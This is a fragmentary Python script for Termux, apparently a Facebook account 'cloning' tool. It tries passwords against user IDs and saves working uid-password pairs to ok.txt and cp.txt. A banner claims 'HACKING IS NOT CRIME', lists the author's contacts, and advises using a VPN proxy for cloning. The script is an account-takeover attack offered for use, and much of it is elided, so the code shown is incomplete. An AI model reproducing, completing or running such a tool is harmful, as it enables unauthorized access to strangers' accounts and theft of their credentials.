...
"""
try:
    my = requests.get("https://www.facebook.com/Rashed.Error.403")
...
if not os.path.isfile("/data/data/com.termux/files/home/simple/jjjjj/node_modules/bytes/index.js"):
    ...
    os.system("xdg-open https://www.facebook.com/Rashed.Error.403")
    time.sleep(10)
agents = [
...
\033[1;37m░█─░█ ░█▄▄▄█ ░█▄▄▄█ ░█▄▄▄█ ░█─░█ ▄█▄ ░█──▀█
\033[1;37m-----------------------------------------------  
\033[1;37mHACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM
\033[1;36mFROM : SHARIATPUR DHAKA BANGLADESH
\033[1;36m(*) Author NAME :\033[1;37m RASHED HOSSAIN
\033[1;36mWHATSAPP NO : +27618543540
\033[1;36mWARNING : DON'T COPY MY SCRIPT
\033[1;36mWARNING : USE TOUCH VPN PROXY SINGAPORE FOR CLONING
\033[1;36mWARNING : USE FAST 4G INTERNER & USE 6GB RAM PHONE
\033[1;36mIF YOU HAVE ANY PROBLEM KNOCK ME FB OR WHATSAPP FB NAME: ISLAM TALUKDER
\033[1;36m(*) FACEBOOK ID USER LINK: Rashed.Error.403
\033[1;36m(*) WARNING : STAY HOME STAY SAVE
\033[1;37m-----------------------------------------------
"""
def login():
    os.system("clear")
		                ...
		                if 'access_token' in d:
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;31m[RASHED-HOSSAIN-OK] "+uid+" | "+pass4)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                                ...
		                                if 'access_token' in d:
		                                    print("\x1b[1;32m[RASHED-HOSSAIN-CP] \033[1;32m"+uid+" | "+pass4+"\x1b[1;37m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
